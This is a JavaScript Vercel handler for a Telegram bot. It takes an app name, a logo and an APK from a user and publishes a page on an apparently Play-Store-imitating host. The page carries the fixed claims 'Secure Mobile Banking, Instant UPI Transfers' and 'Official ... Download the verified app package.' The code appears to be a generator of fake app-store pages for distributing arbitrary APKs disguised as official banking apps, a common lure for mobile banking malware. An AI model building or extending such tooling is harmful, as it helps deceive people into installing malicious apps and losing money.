import { head, put, del } from '@vercel/blob';

const token = process.env.TELEGRAM_BOT_TOKEN;
const blobToken = process.env.BLOB_READ_WRITE_TOKEN || process.env.VERCEL_BLOB_READ_WRITE_TOKEN;

async function telegram(method, body) {
	if (!token) {
		console.error('TELEGRAM_BOT_TOKEN is missing');
		return { ok: false, description: 'Token missing' };
	}
	try {
		const result = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
			method: 'POST',
			headers: { 'content-type': 'application/json' },
			body: JSON.stringify(body),
		});
		return await result.json();
	} catch (err) {
		console.error(`Telegram API error (${method}):`, err);
		return { ok: false, error: err.message };
	}
}

async function saveTelegramFile(fileId, path) {
	const file = await telegram('getFile', { file_id: fileId });
	if (!file.ok || !file.result?.file_path) {
		throw new Error(`Telegram file lookup failed: ${file.description || 'Unknown error'}`);
	}
	const download = await fetch(`https://api.telegram.org/file/bot${token}/${file.result.file_path}`);
	if (!download.ok) throw new Error(`Telegram file download failed: ${download.statusText}`);

	const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
	if (blobToken) options.token = blobToken;
	const blob = await put(path, await download.arrayBuffer(), options);
	return blob.url;
}

async function loadSession(chatId) {
	try {
		const options = { access: 'private' };
		if (blobToken) options.token = blobToken;
		const record = await head(`sessions/${chatId}.json`, options);
		if (record?.url) {
			const res = await fetch(`${record.url}?_t=${Date.now()}`, {
				cache: 'no-store',
				headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate' },
			});
			if (res.ok) return await res.json();
		}
	} catch (err) {
		// Session doesn't exist yet or Blob error
	}
	return { step: 'name', data: {} };
}

async function saveSession(chatId, session) {
	try {
		const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
		if (blobToken) options.token = blobToken;
		await put(`sessions/${chatId}.json`, JSON.stringify(session), options);
	} catch (err) {
		console.error('Error saving session to Blob:', err);
	}
}

function slugify(value) {
	return `${value.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '').slice(0, 40)}-${Date.now().toString(36)}`;
}

export default async function handler(request, response) {
	if (request.method !== 'POST') return response.status(405).json({ error: 'POST only' });
	if (!token) {
		console.error('TELEGRAM_BOT_TOKEN environment variable is missing on Vercel');
		return response.status(500).json({ error: 'TELEGRAM_BOT_TOKEN is missing' });
	}

	let update = request.body;
	if (typeof update === 'string') {
		try {
			update = JSON.parse(update);
		} catch {
			update = {};
		}
	}

	const message = update?.message || update?.edited_message;
	const callbackQuery = update?.callback_query;

	const chatId = message?.chat?.id || callbackQuery?.message?.chat?.id;
	if (!chatId) {
		return response.status(200).json({ ok: true });
	}

	try {
		if (callbackQuery) {
			await telegram('answerCallbackQuery', { callback_query_id: callbackQuery.id });
			if (callbackQuery.data === 'new_link') {
				await saveSession(chatId, { step: 'name', data: {} });
				await telegram('sendMessage', {
					chat_id: chatId,
					text: '✅ Process restarted\n\n1/3 App ka naam Bhejiye.',
				});
				return response.status(200).json({ ok: true });
			}
		}

		const text = (message?.text || '').trim();
		const isImagePhoto = Array.isArray(message?.photo) && message.photo.length > 0;
		const isImageDoc = !!(
			message?.document?.mime_type?.startsWith('image/') ||
			/\.(png|jpg|jpeg|webp|svg|bmp)$/i.test(message?.document?.file_name || '')
		);
		const isApkDoc = !!(
			message?.document?.file_name?.toLowerCase().endsWith('.apk') ||
			message?.document?.mime_type === 'application/vnd.android.package-archive'
		);

		// Handle /start command
		if (text.startsWith('/start')) {
			await saveSession(chatId, { step: 'name', data: {} });
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '✅ Process started\n\n1/3 App ka naam Bhejiye.',
			});
			return response.status(200).json({ ok: true });
		}

		const session = await loadSession(chatId);

		// 1. If user sent an Image/Photo (Step 2)
		if (isImagePhoto || isImageDoc) {
			const fileId = isImagePhoto
				? message.photo[message.photo.length - 1].file_id
				: message.document.file_id;

			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading logo image...' });
			session.data.logoFileId = fileId;
			session.data.logoUrl = await saveTelegramFile(fileId, `apps/${chatId}/logo`);
			session.step = 'apk';
			if (!session.data.name) {
				session.data.name = 'App';
				session.data.developer = 'App Official';
			}
			await saveSession(chatId, session);
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '✅ 2/3 App icon received\n\n3/3 Ab APK document bhejiye (.apk file).',
			});
			return response.status(200).json({ ok: true });
		}

		// 2. If user sent an APK Document (Step 3)
		if (isApkDoc) {
			await telegram('sendMessage', { chat_id: chatId, text: '⏳ Uploading APK & generating Play Store page...' });
			const slug = slugify(session.data.name || 'app');
			session.data.apkUrl = await saveTelegramFile(message.document.file_id, `apps/${slug}/base.apk`);
			if (session.data.logoFileId) {
				await saveTelegramFile(session.data.logoFileId, `apps/${slug}/logo`);
			}

			const host = request.headers.host || 'playstore-web-143.vercel.app';
			const logoUrl = `https://${host}/api/blob?key=${encodeURIComponent(`apps/${slug}/logo`)}`;
			const apkUrl = `https://${host}/api/blob?key=${encodeURIComponent(`apps/${slug}/base.apk`)}`;

			session.data.slug = slug;
			session.data.logoUrl = logoUrl;
			session.data.apkUrl = apkUrl;
			session.data.name = session.data.name || 'App';
			session.data.developer = session.data.developer || `${session.data.name} Official`;
			session.data.category = 'APPS';
			session.data.tagline = 'Secure Mobile Banking, Instant UPI Transfers & Financial Services';
			session.data.description = `Official ${session.data.name} app by ${session.data.developer}. Download the verified app package.`;
			session.data.version = '1.0.0';

			const options = { access: 'private', addRandomSuffix: false, allowOverwrite: true };
			if (blobToken) options.token = blobToken;
			await put(`apps/${slug}.json`, JSON.stringify(session.data), options);

			const liveUrl = `https://${host}/app/${slug}`;

			const replyMarkup = {
				inline_keyboard: [
					[
						{ text: '🆘 Help', url: 'https://t.me/sanaminfotech' },
						{ text: '➕ New Link', callback_data: 'new_link' },
					],
				],
			};

			await telegram('sendMessage', {
				chat_id: chatId,
				text: `🎉 Files uploaded\n✅ Page deployed & READY!\n\n🔗 ${liveUrl}`,
				reply_markup: replyMarkup,
			});

			try {
				if (blobToken) options.token = blobToken;
				await del(`sessions/${chatId}.json`, options);
			} catch {}

			return response.status(200).json({ ok: true });
		}

		// 3. If user sent a non-APK document when expecting APK
		if (message?.document && !isApkDoc && !isImageDoc) {
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '⚠️ Kripya valid .apk file bhejiye (.apk extension wali file).',
			});
			return response.status(200).json({ ok: true });
		}

		// 4. If user sent Text (Step 1: App Name)
		if (text && !text.startsWith('/')) {
			session.data.name = text;
			session.data.developer = `${text} Official`;
			session.step = 'logo';
			await saveSession(chatId, session);
			await telegram('sendMessage', {
				chat_id: chatId,
				text: '✅ 1/3 App name received\n\n2/3 Ab app ka logo / icon image Bhejiye.',
			});
			return response.status(200).json({ ok: true });
		}

		// Fallback guidance
		await telegram('sendMessage', {
			chat_id: chatId,
			text: 'ℹ️ Current step ke hisaab se input bhejiye ya /start se dobara shuru karein.',
		});
	} catch (error) {
		console.error('Webhook processing error:', error);
		await telegram('sendMessage', {
			chat_id: chatId,
			text: `⚠️ Error occurred: ${error.message || 'Unknown error'}. Kripya /start se dobara try karein.`,
		});
	}

	return response.status(200).json({ ok: true });
}